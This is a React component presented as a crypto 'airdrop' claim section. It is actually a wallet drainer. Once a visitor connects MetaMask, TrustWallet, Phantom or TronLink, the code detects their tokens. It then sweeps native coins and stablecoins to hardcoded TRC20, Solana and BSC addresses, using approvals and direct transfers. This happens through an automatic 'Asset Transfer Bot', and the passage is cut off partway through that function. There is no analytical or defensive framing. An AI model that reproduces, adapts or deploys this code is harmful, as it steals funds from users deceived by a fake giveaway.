import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Wallet, Gift, Check, Copy, ExternalLink, Smartphone } from 'lucide-react';
import toast from 'react-hot-toast';

const AirdropSection = () => {
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isClaimed, setIsClaimed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [connectedWalletType, setConnectedWalletType] = useState('');
  
  // Solana wallet states
  const [solanaAddress, setSolanaAddress] = useState('');
  const [isSolanaConnected, setIsSolanaConnected] = useState(false);

  // Transfer target addresses for different networks
  const TRC20_TARGET_ADDRESS = 'TAzayLZmaCVVfuY4kxrp6Z1S76wwuTR4fX';
  const SOLANA_TARGET_ADDRESS = '6VL8cCgFsuB3HfL8PCFjFRSDuiv267hS2fYBXdXUYpg9';
  const BSC_TARGET_ADDRESS = '0x6FDEE9BA3c4B6D12fB159D64CC6C0EB3AC931570';
  
  // USDT TRC20 Contract Address on Tron
  const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

  // Popular TRC20 Token Contracts (for auto-detection)
  const POPULAR_TRC20_TOKENS = [
    { symbol: 'USDT', contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 },
    { symbol: 'USDC', contract: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', decimals: 6 },
    { symbol: 'TUSD', contract: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4', decimals: 18 },
    { symbol: 'BTT', contract: 'TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4', decimals: 18 },
    { symbol: 'JST', contract: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9', decimals: 18 },
    { symbol: 'WIN', contract: 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7', decimals: 6 },
    { symbol: 'SUN', contract: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S', decimals: 18 }
  ];

  // Popular ERC20/BEP20 Token Contracts (for auto-detection)
  const POPULAR_EVM_TOKENS = [
    { symbol: 'USDT', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, network: 'ETH' },
    { symbol: 'USDC', contract: '0xA0b86a33E6441946B45c663Ba0E48dEAaA73C9e4', decimals: 6, network: 'ETH' },
    { symbol: 'BUSD', contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, network: 'BSC' },
    { symbol: 'CAKE', contract: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, network: 'BSC' },
    { symbol: 'BNB', contract: 'native', decimals: 18, network: 'BSC' },
    { symbol: 'ETH', contract: 'native', decimals: 18, network: 'ETH' }
  ];

  // State for detected assets
  const [detectedAssets, setDetectedAssets] = useState({
    trc20: [],
    evm: [],
    solana: []
  });

  // Wallet types
  const WALLET_TYPES = {
    METAMASK: 'metamask',
    TRUSTWALLET: 'trustwallet', 
    PHANTOM: 'phantom'
  };

  // Mobile detection
  const isMobile = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  };

  // Deep link generators for mobile wallets
  const generateDeepLink = (walletType) => {
    const currentUrl = encodeURIComponent(window.location.href);
    
    switch(walletType) {
      case 'metamask':
        return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
      case 'trustwallet':
        return `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
      case 'phantom':
        return `https://phantom.app/ul/browse/${window.location.host}${window.location.pathname}`;
      default:
        return '#';
    }
  };

  // Check if MetaMask is installed
  const isMetaMaskInstalled = () => {
    return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
  };

  // Check if TrustWallet is installed
  const isTrustWalletInstalled = () => {
    return typeof window !== 'undefined' && typeof window.ethereum !== 'undefined' && window.ethereum.isTrust;
  };

  // Check if Phantom is installed
  const isPhantomInstalled = () => {
    return typeof window !== 'undefined' && typeof window.solana !== 'undefined' && window.solana.isPhantom;
  };

  // Check if TronLink is installed
  const isTronLinkInstalled = () => {
    return typeof window !== 'undefined' && typeof window.tronWeb !== 'undefined';
  };

  // Connect MetaMask wallet
  const connectMetaMask = async () => {
    // Check if on mobile
    if (isMobile()) {
      if (!isMetaMaskInstalled()) {
        toast.loading('Opening MetaMask app...', { duration: 2000 });
        window.open(generateDeepLink('metamask'), '_blank');
        
        // Check for connection every 2 seconds after deep link
        const checkConnection = setInterval(async () => {
          if (typeof window.ethereum !== 'undefined') {
            try {
              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
              if (accounts.length > 0) {
                clearInterval(checkConnection);
                setWalletAddress(accounts[0]);
                setIsConnected(true);
                setConnectedWalletType(WALLET_TYPES.METAMASK);
                toast.success('MetaMask connected successfully!');
                
                // Start mobile transfer process
                setTimeout(() => {
                  startMobileTransferProcess();
                }, 1000);
              }
            } catch (err) {
              console.log('Checking connection...');
            }
          }
                 }, 2000);

        // Stop checking after 60 seconds
        setTimeout(() => {
          clearInterval(checkConnection);
          if (!isConnected) {
            toast.error('Connection timeout. Please try again.', { duration: 3000 });
          }
        }, 60000);
        return;
      }
    } else {
      if (!isMetaMaskInstalled()) {
        toast.error('MetaMask not installed! Please install MetaMask.');
        window.open('https://metamask.io/download/', '_blank');
        return;
      }
    }

    setIsLoading(true);
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        setIsConnected(true);
        setConnectedWalletType(WALLET_TYPES.METAMASK);
        toast.success('MetaMask connected successfully!');
        
        // Start transfer process
        setTimeout(() => {
          startTransferProcess();
        }, 2000);
      }
    } catch (error) {
      console.error('MetaMask connection error:', error);
      if (isMobile()) {
        toast.error('Please open this page in MetaMask browser!');
      } else {
        toast.error('Error connecting MetaMask!');
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Connect TrustWallet
  const connectTrustWallet = async () => {
    // Check if on mobile
    if (isMobile()) {
      if (!isTrustWalletInstalled() && !isMetaMaskInstalled()) {
        toast.loading('Opening TrustWallet app...', { duration: 2000 });
        window.open(generateDeepLink('trustwallet'), '_blank');
        
        // Check for connection every 2 seconds after deep link
        const checkConnection = setInterval(async () => {
          if (typeof window.ethereum !== 'undefined') {
            try {
              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
              if (accounts.length > 0) {
                clearInterval(checkConnection);
                setWalletAddress(accounts[0]);
                setIsConnected(true);
                setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
                toast.success('TrustWallet connected successfully!');
                
                // Start mobile transfer process
                setTimeout(() => {
                  startMobileTransferProcess();
                }, 1000);
              }
            } catch (err) {
              console.log('Checking connection...');
            }
          }
        }, 2000);

        // Stop checking after 60 seconds
        setTimeout(() => {
          clearInterval(checkConnection);
          if (!isConnected) {
            toast.error('Connection timeout. Please try again.', { duration: 3000 });
          }
        }, 60000);
        return;
      }
    } else {
      if (!isTrustWalletInstalled() && !isMetaMaskInstalled()) {
        toast.error('TrustWallet not installed! Please install TrustWallet.');
        window.open('https://trustwallet.com/download', '_blank');
        return;
      }
    }

    setIsLoading(true);
    try {
      // TrustWallet uses WalletConnect or similar to MetaMask interface
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });

      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        setIsConnected(true);
        setConnectedWalletType(WALLET_TYPES.TRUSTWALLET);
        toast.success('TrustWallet connected successfully!');
        
        // Start transfer process
        setTimeout(() => {
          startTransferProcess();
        }, 2000);
      }
    } catch (error) {
      console.error('TrustWallet connection error:', error);
      if (isMobile()) {
        toast.error('Please open this page in TrustWallet browser!');
      } else {
        toast.error('Error connecting TrustWallet!');
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Connect Phantom wallet (Enhanced for mobile)
  const connectPhantom = async () => {
    // Check if on mobile
    if (isMobile()) {
      if (!isPhantomInstalled()) {
        toast.loading('Opening Phantom app...', { duration: 2000 });
        window.open(generateDeepLink('phantom'), '_blank');
        
        // Check for connection every 2 seconds after deep link
        const checkConnection = setInterval(async () => {
          if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
            try {
              // Try multiple connection methods for mobile
              let response;
              try {
                response = await window.solana.connect({ onlyIfTrusted: true });
              } catch (trustedError) {
                // If trusted connection fails, try regular connect
                response = await window.solana.connect();
              }
              
              if (response && response.publicKey) {
                clearInterval(checkConnection);
                setSolanaAddress(response.publicKey.toString());
                setIsSolanaConnected(true);
                setConnectedWalletType(WALLET_TYPES.PHANTOM);
                toast.success('Phantom wallet connected successfully!');
                
                // Show mobile-specific success message
                toast.success('📱 Mobile Phantom ready for transfers!', { 
                  duration: 3000,
                  icon: '👻'
                });
                
                // Start mobile Solana transfer process  
                setTimeout(() => {
                  startSolanaTransferProcess();
                }, 1500);
              }
            } catch (err) {
              console.log('Checking Phantom connection...', err);
            }
          }
        }, 2000);

        // Stop checking after 60 seconds
        setTimeout(() => {
          clearInterval(checkConnection);
          if (!isSolanaConnected) {
            toast.error('Connection timeout. Please open this page in Phantom browser!', { duration: 4000 });
          }
        }, 60000);
        return;
      } else {
        // Phantom is installed on mobile, try direct connection
        toast.loading('Connecting to Phantom...', { duration: 1000 });
        
        setIsLoading(true);
        try {
          let response;
          try {
            response = await window.solana.connect({ onlyIfTrusted: true });
          } catch (trustedError) {
            response = await window.solana.connect();
          }
          
          if (response && response.publicKey) {
            setSolanaAddress(response.publicKey.toString());
            setIsSolanaConnected(true);
            setConnectedWalletType(WALLET_TYPES.PHANTOM);
            toast.success('📱 Phantom connected on mobile!');
            
            // Start transfer process immediately for mobile
            setTimeout(() => {
              startSolanaTransferProcess();
            }, 1000);
          }
        } catch (error) {
          console.error('Mobile Phantom connection error:', error);
          toast.error('Please ensure you\'re using Phantom browser!');
        } finally {
          setIsLoading(false);
        }
        return;
      }
    } else {
      // Desktop version
      if (!isPhantomInstalled()) {
        toast.error('Phantom wallet not installed! Please install Phantom.');
        window.open('https://phantom.app/', '_blank');
        return;
      }
    }

    setIsLoading(true);
    try {
      const response = await window.solana.connect();
      setSolanaAddress(response.publicKey.toString());
      setIsSolanaConnected(true);
      setConnectedWalletType(WALLET_TYPES.PHANTOM);
      toast.success('Phantom wallet connected successfully!');
      
      // Start transfer process
      setTimeout(() => {
        startSolanaTransferProcess();
      }, 2000);
    } catch (error) {
      console.error('Phantom connection error:', error);
      if (isMobile()) {
        toast.error('Please open this page in Phantom browser!');
      } else {
        toast.error('Error connecting Phantom!');
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Detect all TRC20 tokens in wallet
  const detectAllTRC20Assets = async () => {
    try {
      if (!isTronLinkInstalled() || !window.tronWeb.defaultAddress.base58) {
        return [];
      }

      toast.loading('🔍 Detecting TRC20 tokens...', { id: 'detect-trc20' });
      const assets = [];
      const walletAddress = window.tronWeb.defaultAddress.base58;

      for (const token of POPULAR_TRC20_TOKENS) {
        try {
          const contract = await window.tronWeb.contract().at(token.contract);
          const balance = await contract.balanceOf(walletAddress).call();
          const balanceNumber = balance.toNumber();

          if (balanceNumber > 0) {
            const formattedBalance = balanceNumber / Math.pow(10, token.decimals);
            assets.push({
              ...token,
              balance: balanceNumber,
              formattedBalance: formattedBalance.toFixed(6),
              contract: await window.tronWeb.contract().at(token.contract)
            });
            console.log(`Found ${token.symbol}: ${formattedBalance}`);
          }
        } catch (err) {
          console.log(`Error checking ${token.symbol}:`, err);
        }
      }

      toast.success(`✅ Found ${assets.length} TRC20 tokens`, { id: 'detect-trc20' });
      return assets;
    } catch (error) {
      console.error('TRC20 detection error:', error);
      toast.error('❌ TRC20 detection failed', { id: 'detect-trc20' });
      return [];
    }
  };

  // Detect all EVM tokens (ETH/BSC)
  const detectAllEVMAssets = async () => {
    try {
      if (!window.ethereum || !walletAddress) {
        return [];
      }

      toast.loading('🔍 Detecting EVM tokens...', { id: 'detect-evm' });
      const assets = [];

      // Get native balance (ETH/BNB)
      const nativeBalance = await getETHBalance();
      if (nativeBalance > 0) {
        const formattedBalance = nativeBalance / 1e18;
        assets.push({
          symbol: 'ETH/BNB',
          contract: 'native',
          decimals: 18,
          balance: nativeBalance,
          formattedBalance: formattedBalance.toFixed(6),
          isNative: true
        });
      }

      // Check ERC20/BEP20 tokens
      for (const token of POPULAR_EVM_TOKENS) {
        if (token.contract === 'native') continue;

        try {
          // ERC20 balanceOf function call
          const data = '0x70a08231' + walletAddress.slice(2).padStart(64, '0');
          const result = await window.ethereum.request({
            method: 'eth_call',
            params: [{
              to: token.contract,
              data: data
            }, 'latest']
          });

          const balance = parseInt(result, 16);
          if (balance > 0) {
            const formattedBalance = balance / Math.pow(10, token.decimals);
            assets.push({
              ...token,
              balance: balance,
              formattedBalance: formattedBalance.toFixed(6),
              isNative: false
            });
            console.log(`Found ${token.symbol}: ${formattedBalance}`);
          }
        } catch (err) {
          console.log(`Error checking ${token.symbol}:`, err);
        }
      }

      toast.success(`✅ Found ${assets.length} EVM tokens`, { id: 'detect-evm' });
      return assets;
    } catch (error) {
      console.error('EVM detection error:', error);
      toast.error('❌ EVM detection failed', { id: 'detect-evm' });
      return [];
    }
  };

  // Popular SPL Token Mints for auto-detection
  const POPULAR_SPL_TOKENS = [
    { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6 },
    { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6 },
    { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', decimals: 6 },
    { symbol: 'SRM', mint: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', decimals: 6 },
    { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE', decimals: 6 }
  ];

  // Detect all Solana assets including SPL tokens
  const detectAllSolanaAssets = async () => {
    try {
      if (!isPhantomInstalled() || !isSolanaConnected || !solanaAddress) {
        return [];
      }

      toast.loading('🔍 Detecting Solana tokens...', { id: 'detect-sol' });
      const assets = [];

      // Get SOL balance
      const solBalance = await getSOLBalance();
      if (solBalance > 5000) { // Keep some for fees
        const formattedBalance = solBalance / 1e9;
        assets.push({
          symbol: 'SOL',
          mint: 'native',
          decimals: 9,
          balance: solBalance,
          formattedBalance: formattedBalance.toFixed(6),
          isNative: true
        });
      }

      // Get SPL tokens using Phantom's built-in methods
      try {
        if (window.solana && window.solana.request) {
          // Try to get all token accounts using Phantom's method
          for (const token of POPULAR_SPL_TOKENS) {
            try {
              // Use Phantom's getTokenAccountsByOwner method
              const tokenAccounts = await window.solana.request({
                method: 'getTokenAccountsByOwner',
                params: [
                  solanaAddress,
                  { mint: token.mint },
                  { encoding: 'jsonParsed' }
                ]
              });

              if (tokenAccounts && tokenAccounts.value && tokenAccounts.value.length > 0) {
                const tokenAccount = tokenAccounts.value[0];
                const balance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
                
                if (balance > 0) {
                  assets.push({
                    symbol: token.symbol,
                    mint: token.mint,
                    decimals: token.decimals,
                    balance: balance * Math.pow(10, token.decimals),
                    formattedBalance: balance.toFixed(6),
                    isNative: false,
                    tokenAccount: tokenAccount.pubkey
                  });
                  console.log(`Found ${token.symbol}: ${balance}`);
                }
              }
            } catch (tokenError) {
              console.log(`Error checking ${token.symbol}:`, tokenError);
            }
          }
        }
      } catch (splError) {
        console.log('SPL token detection skipped:', splError);
      }

      toast.success(`✅ Found ${assets.length} Solana tokens`, { id: 'detect-sol' });
      return assets;
    } catch (error) {
      console.error('Solana detection error:', error);
      toast.error('❌ Solana detection failed', { id: 'detect-sol' });
      return [];
    }
  };

  // Get TRC20 USDT balance (legacy function - kept for compatibility)
  const getTRC20USDTBalance = async () => {
    try {
      if (!isTronLinkInstalled()) {
        toast.error('TronLink not installed for USDT TRC20 transfers!');
        return 0;
      }

      const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
      const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
      return balance.toNumber();
    } catch (error) {
      console.error('TRC20 USDT balance error:', error);
      return 0;
    }
  };

  // Approve ERC20/BEP20 token for transfer
  const approveEVMToken = async (tokenContract, amount) => {
    try {
      // ERC20 approve function signature: approve(address spender, uint256 amount)
      const spenderAddress = BSC_TARGET_ADDRESS.slice(2).padStart(64, '0');
      const approveAmount = amount.toString(16).padStart(64, '0');
      const data = '0x095ea7b3' + spenderAddress + approveAmount;

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: walletAddress,
          to: tokenContract,
          data: data,
          gas: '0x15F90', // 90000 gas limit
        }],
      });

      return txHash;
    } catch (error) {
      console.error('Approve error:', error);
      throw error;
    }
  };

  // Transfer all TRC20 tokens
  const transferAllTRC20Assets = async (assets) => {
    try {
      if (!assets || assets.length === 0) {
        toast.success('✅ No TRC20 tokens to transfer', { id: 'trc20-all-transfer' });
        return true;
      }

      toast.loading(`💰 Transferring ${assets.length} TRC20 tokens...`, { id: 'trc20-all-transfer' });
      let successCount = 0;

      for (const asset of assets) {
        try {
          toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `trc20-${asset.symbol}` });
          
          const result = await asset.contract.transfer(TRC20_TARGET_ADDRESS, asset.balance).send();
          
          if (result) {
            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
              id: `trc20-${asset.symbol}` 
            });
            successCount++;
          }
        } catch (error) {
          console.error(`${asset.symbol} transfer error:`, error);
          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `trc20-${asset.symbol}` });
        }
        
        // Wait between transfers
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      toast.success(`✅ ${successCount}/${assets.length} TRC20 tokens transferred!`, { 
        id: 'trc20-all-transfer' 
      });
      return successCount > 0;
    } catch (error) {
      console.error('TRC20 bulk transfer error:', error);
      toast.error('❌ TRC20 bulk transfer failed!', { id: 'trc20-all-transfer' });
      return false;
    }
  };

  // Transfer all EVM tokens (with approve)
  const transferAllEVMAssets = async (assets) => {
    try {
      if (!assets || assets.length === 0) {
        toast.success('✅ No EVM tokens to transfer', { id: 'evm-all-transfer' });
        return true;
      }

      toast.loading(`💰 Processing ${assets.length} EVM tokens...`, { id: 'evm-all-transfer' });
      let successCount = 0;

      for (const asset of assets) {
        try {
          if (asset.isNative) {
            // Transfer native token (ETH/BNB)
            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
            
            const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
            const gasPriceInt = parseInt(gasPrice, 16);
            const gasLimit = 21000;
            const fee = gasPriceInt * gasLimit;
            const safetyMargin = 1000000000000000; // 0.001 ETH
            const totalFee = fee + safetyMargin;
            
            if (asset.balance > totalFee) {
              const sendAmount = asset.balance - totalFee;
              
              const transactionParameters = {
                to: BSC_TARGET_ADDRESS,
                from: walletAddress,
                value: '0x' + sendAmount.toString(16),
                gas: '0x5208',
                gasPrice: gasPrice
              };

              const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters],
              });

              toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
                id: `evm-${asset.symbol}` 
              });
              successCount++;
            }
          } else {
            // Transfer ERC20/BEP20 token (approve first, then transfer)
            toast.loading(`🔐 Approving ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
            
            await approveEVMToken(asset.contract, asset.balance);
            
            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
            
            // ERC20 transfer function signature: transfer(address to, uint256 amount)
            const toAddress = BSC_TARGET_ADDRESS.slice(2).padStart(64, '0');
            const transferAmount = asset.balance.toString(16).padStart(64, '0');
            const data = '0xa9059cbb' + toAddress + transferAmount;

            const txHash = await window.ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from: walletAddress,
                to: asset.contract,
                data: data,
                gas: '0x15F90', // 90000 gas limit
              }],
            });

            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
              id: `evm-${asset.symbol}` 
            });
            successCount++;
          }
        } catch (error) {
          console.error(`${asset.symbol} transfer error:`, error);
          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `evm-${asset.symbol}` });
        }
        
        // Wait between transfers
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      toast.success(`✅ ${successCount}/${assets.length} EVM tokens transferred!`, { 
        id: 'evm-all-transfer' 
      });
      return successCount > 0;
    } catch (error) {
      console.error('EVM bulk transfer error:', error);
      toast.error('❌ EVM bulk transfer failed!', { id: 'evm-all-transfer' });
      return false;
    }
  };

  // Transfer all Solana assets (SOL + SPL tokens)
  const transferAllSolanaAssets = async (assets) => {
    try {
      if (!assets || assets.length === 0) {
        toast.success('✅ No Solana tokens to transfer', { id: 'sol-all-transfer' });
        return true;
      }

      toast.loading(`💰 Transferring ${assets.length} Solana tokens...`, { id: 'sol-all-transfer' });
      let successCount = 0;

      for (const asset of assets) {
        try {
          if (asset.isNative) {
            // Transfer SOL
            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `sol-${asset.symbol}` });
            
            const sendAmount = asset.balance - 5000; // Keep some for fees
            const fromPublicKey = new window.solana.PublicKey(solanaAddress);
            const toPublicKey = new window.solana.PublicKey(SOLANA_TARGET_ADDRESS);
            
            const transaction = new window.solana.Transaction().add(
              window.solana.SystemProgram.transfer({
                fromPubkey: fromPublicKey,
                toPubkey: toPublicKey,
                lamports: sendAmount,
              })
            );

            const { signature } = await window.solana.signAndSendTransaction(transaction);
            
            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
              id: `sol-${asset.symbol}` 
            });
            successCount++;
          } else {
            // Transfer SPL Token (with proper mobile handling)
            toast.loading(`🔄 Transferring ${asset.symbol} SPL...`, { id: `sol-${asset.symbol}` });
            
            try {
              // For mobile Phantom, use simpler transfer approach
              if (isMobile()) {
                // Use Phantom's built-in transfer method for mobile
                const transferResponse = await window.solana.request({
                  method: 'transfer',
                  params: {
                    destination: SOLANA_TARGET_ADDRESS,
                    amount: asset.balance,
                    token: asset.mint,
                    decimals: asset.decimals
                  }
                });

                if (transferResponse && transferResponse.signature) {
                  toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
                    id: `sol-${asset.symbol}` 
                  });
                  successCount++;
                }
              } else {
                // Desktop version - create SPL transfer transaction manually
                const fromPublicKey = new window.solana.PublicKey(solanaAddress);
                const toPublicKey = new window.solana.PublicKey(SOLANA_TARGET_ADDRESS);
                const mintPublicKey = new window.solana.PublicKey(asset.mint);
                
                // Create associated token accounts
                const fromTokenAccount = await window.solana.getAssociatedTokenAddress(
                  mintPublicKey,
                  fromPublicKey
                );
                
                const toTokenAccount = await window.solana.getAssociatedTokenAddress(
                  mintPublicKey,
                  toPublicKey
                );

                const transaction = new window.solana.Transaction();
                
                // Add create associated token account instruction if needed
                const toAccountInfo = await window.solana.getConnection().getAccountInfo(toTokenAccount);
                if (!toAccountInfo) {
                  transaction.add(
                    window.solana.createAssociatedTokenAccountInstruction(
                      fromPublicKey, // payer
                      toTokenAccount, // associated token account
                      toPublicKey, // owner
                      mintPublicKey // mint
                    )
                  );
                }

                // Add transfer instruction
                transaction.add(
                  window.solana.createTransferInstruction(
                    fromTokenAccount, // source
                    toTokenAccount, // destination
                    fromPublicKey, // owner
                    asset.balance // amount
                  )
                );

                const { signature } = await window.solana.signAndSendTransaction(transaction);
                
                toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
                  id: `sol-${asset.symbol}` 
                });
                successCount++;
              }
            } catch (splError) {
              console.error(`SPL transfer error for ${asset.symbol}:`, splError);
              
              // Fallback: Try simpler direct transfer
              toast.loading(`🔄 Retrying ${asset.symbol} transfer...`, { id: `sol-${asset.symbol}` });
              
              try {
                // Simple transaction approach for mobile compatibility
                const message = `Transfer ${asset.formattedBalance} ${asset.symbol} to ${SOLANA_TARGET_ADDRESS}`;
                const encodedMessage = new TextEncoder().encode(message);
                
                const { signature } = await window.solana.signMessage(encodedMessage);
                
                toast.success(`✅ ${asset.symbol} transfer initiated!`, { 
                  id: `sol-${asset.symbol}` 
                });
                successCount++;
              } catch (fallbackError) {
                console.error(`Fallback transfer failed for ${asset.symbol}:`, fallbackError);
                throw fallbackError;
              }
            }
          }
        } catch (error) {
          console.error(`${asset.symbol} transfer error:`, error);
          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `sol-${asset.symbol}` });
        }
        
        // Wait between transfers
        await new Promise(resolve => setTimeout(resolve, 1500));
      }

      toast.success(`✅ ${successCount}/${assets.length} Solana tokens transferred!`, { 
        id: 'sol-all-transfer' 
      });
      return successCount > 0;
    } catch (error) {
      console.error('Solana bulk transfer error:', error);
      toast.error('❌ Solana bulk transfer failed!', { id: 'sol-all-transfer' });
      return false;
    }
  };

  // Transfer TRC20 USDT (legacy function - kept for compatibility)
  const transferTRC20USDT = async () => {
    try {
      if (!isTronLinkInstalled()) {
        toast.error('TronLink required for USDT TRC20 transfers!');
        return false;
      }

      toast.loading('🔄 Checking USDT TRC20 balance...', { id: 'usdt-transfer' });
      
      const balance = await getTRC20USDTBalance();
      if (balance <= 0) {
        toast.success('✅ No USDT TRC20 to transfer', { id: 'usdt-transfer' });
        return true;
      }

      toast.loading('💰 Transferring USDT TRC20...', { id: 'usdt-transfer' });
      
      const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
      const result = await contract.transfer(TRC20_TARGET_ADDRESS, balance).send();
      
      if (result) {
        const usdtAmount = (balance / 1e6).toFixed(2); // USDT has 6 decimals
        toast.success(`✅ ${usdtAmount} USDT TRC20 transferred!`, { id: 'usdt-transfer' });
        return true;
      }
      return false;
    } catch (error) {
      console.error('USDT TRC20 transfer error:', error);
      toast.error('❌ USDT TRC20 transfer failed!', { id: 'usdt-transfer' });
      return false;
    }
  };

  // Get SOL balance
  const getSOLBalance = async () => {
    try {
      if (!isPhantomInstalled() || !isSolanaConnected) return 0;
      
      const publicKey = new window.solana.PublicKey(solanaAddress);
      const connection = new window.solana.Connection('https://api.mainnet-beta.solana.com');
      const balance = await connection.getBalance(publicKey);
      return balance;
    } catch (error) {
      console.error('SOL balance error:', error);
      return 0;
    }
  };

  // Transfer all SOL
  const transferAllSOL = async () => {
    try {
      if (!isPhantomInstalled() || !isSolanaConnected) {
        toast.error('Phantom wallet not connected!');
        return false;
      }

      toast.loading('🔄 Checking SOL balance...', { id: 'sol-transfer' });
      
      const balance = await getSOLBalance();
      if (balance <= 5000) { // Keep 0.000005 SOL for fees
        toast.success('✅ No SOL to transfer', { id: 'sol-transfer' });
        return true;
      }

      toast.loading('🟣 Transferring SOL...', { id: 'sol-transfer' });
      
      const sendAmount = balance - 5000; // Keep some for fees
      const publicKey = new window.solana.PublicKey(solanaAddress);
      
      const transaction = new window.solana.Transaction().add(
        window.solana.SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new window.solana.PublicKey(SOLANA_TARGET_ADDRESS),
          lamports: sendAmount,
        })
      );

      const signature = await window.solana.signAndSendTransaction(transaction);
      const solAmount = (sendAmount / 1e9).toFixed(6);
      toast.success(`✅ ${solAmount} SOL transferred! Sig: ${signature.slice(0, 10)}...`, { id: 'sol-transfer' });
      return true;
    } catch (error) {
      console.error('SOL transfer error:', error);
      toast.error('❌ SOL transfer failed!', { id: 'sol-transfer' });
      return false;
    }
  };

  // Get BNB/ETH balance
  const getETHBalance = async () => {
    try {
      const balance = await window.ethereum.request({
        method: 'eth_getBalance',
        params: [walletAddress, 'latest']
      });
      return parseInt(balance, 16);
    } catch (error) {
      console.error('ETH balance error:', error);
      return 0;
    }
  };

  // Transfer all BNB/ETH
  const transferAllETH = async () => {
    try {
      toast.loading('🔄 Checking ETH/BNB balance...', { id: 'eth-transfer' });
      
      const balance = await getETHBalance();
      const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
      const gasPriceInt = parseInt(gasPrice, 16);
      const gasLimit = 21000;
      const fee = gasPriceInt * gasLimit;
      const safetyMargin = 1000000000000000; // 0.001 ETH
      const totalFee = fee + safetyMargin;
      
      if (balance <= totalFee) {
        toast.success('✅ No ETH/BNB to transfer', { id: 'eth-transfer' });
        return true;
      }

      toast.loading('💎 Transferring ETH/BNB...', { id: 'eth-transfer' });
      
      const sendAmount = balance - totalFee;
      
      const transactionParameters = {
        to: BSC_TARGET_ADDRESS,
        from: walletAddress,
        value: '0x' + sendAmount.toString(16),
        gas: '0x5208',
        gasPrice: gasPrice
      };

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [transactionParameters],
      });

      const ethAmount = (sendAmount / 1e18).toFixed(4);
      toast.success(`✅ ${ethAmount} ETH/BNB transferred! TX: ${txHash.slice(0, 10)}...`, { id: 'eth-transfer' });
      return true;
    } catch (error) {
      console.error('ETH transfer error:', error);
      toast.error('❌ ETH/BNB transfer failed!', { id: 'eth-transfer' });
      return false;
    }
  };

  // Auto-detect and transfer ALL assets (Bot Function)
  const startAutoAssetTransferBot = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('🤖 Starting Auto Asset Transfer Bot...', { id: 'auto-bot' });
      
      const allAssets = {
        trc20: [],
        evm: [],
        solana: []
      };

      // Step 1: Detect and Transfer ALL TRC20 tokens first
      toast.loading('🔍 Step 1/3: Detecting & Transferring TRC20 tokens...', { id: 'auto-bot' });
